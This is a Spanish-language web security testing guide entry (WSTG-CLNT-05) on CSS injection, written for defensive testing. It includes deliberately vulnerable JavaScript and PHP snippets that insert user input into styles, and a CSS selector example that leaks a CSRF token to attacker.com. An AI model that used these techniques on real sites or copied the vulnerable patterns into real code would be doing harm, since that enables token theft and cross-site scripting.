Inyección de CSS

ID
WSTG-CLNT-05

Resumen

Una vulnerabilidad de inyección de CSS implica la capacidad de inyectar código CSS arbitrario en el contexto de un sitio de confianza que se renderiza dentro del navegador de la víctima. El impacto de este tipo de vulnerabilidad varía según el payload de CSS proporcionado. Puede conducir a cross-site scripting o a la exfiltración de datos.

Esta vulnerabilidad ocurre cuando la aplicación permite que el CSS proporcionado por el usuario interfiera con las hojas de estilo legítimas de la aplicación. Inyectar código en el contexto CSS puede dar al atacante la capacidad de ejecutar JavaScript en ciertas condiciones, o de extraer valores sensibles mediante selectores y funciones de CSS capaces de generar peticiones HTTP. En general, permitir a los usuarios personalizar las páginas proporcionando archivos CSS propios es un riesgo considerable.

El siguiente código JavaScript muestra un posible script vulnerable en el que el atacante puede controlar location.hash (fuente), que llega a la función cssText (sumidero). Este caso particular puede conducir a XSS basado en DOM en versiones antiguas de navegadores; para más información, consulte la DOM-based XSS Prevention Cheat Sheet.

<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>

Nota: Algunas técnicas de ejecución de JavaScript basadas en CSS dependen del comportamiento de navegadores antiguos (por ejemplo, versiones antiguas de IE y Opera). Aunque los navegadores modernos mitigan la mayoría de estos vectores, la inyección de CSS aún puede permitir la exfiltración de datos, la manipulación de la interfaz de usuario y el encadenamiento de ataques.

La misma vulnerabilidad puede aparecer en el caso de XSS reflejado, por ejemplo, en el siguiente código PHP:

<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>

Otros escenarios de ataque implican la capacidad de extraer datos mediante el uso de reglas CSS puras. Estos ataques pueden realizarse a través de selectores CSS, lo que lleva a la exfiltración de datos, por ejemplo, tokens CSRF.

A continuación se muestra un ejemplo de código que intenta seleccionar un input cuyo name coincide con csrf_token y cuyo value comienza con una a. Utilizando un ataque de fuerza bruta para determinar el value del atributo, es posible llevar a cabo un ataque que envíe el valor al dominio del atacante, por ejemplo intentando establecer una imagen de fondo en el elemento input seleccionado.

<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>

Otros ataques que utilizan contenido solicitado, como CSS, se destacan en la charla de Mario Heiderich, "Got Your Nose" en YouTube.

Objetivos de la prueba

  • Identificar puntos de inyección de CSS.
  • Evaluar el impacto de la inyección.

Cómo probar

Se debe analizar el código para determinar si se permite a un usuario inyectar contenido en el contexto CSS. En particular, hay que inspeccionar la manera en que el sitio devuelve reglas CSS en función de las entradas.

El siguiente es un ejemplo básico:

<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>

El código anterior contiene una fuente, location.hash, controlada por el atacante, que puede inyectar directamente en el atributo style de un elemento HTML. Como se mencionó antes, esto puede producir resultados diferentes según el navegador utilizado y el payload proporcionado.

  • JavaScript based attacks using CSSStyleDeclaration with unescaped input
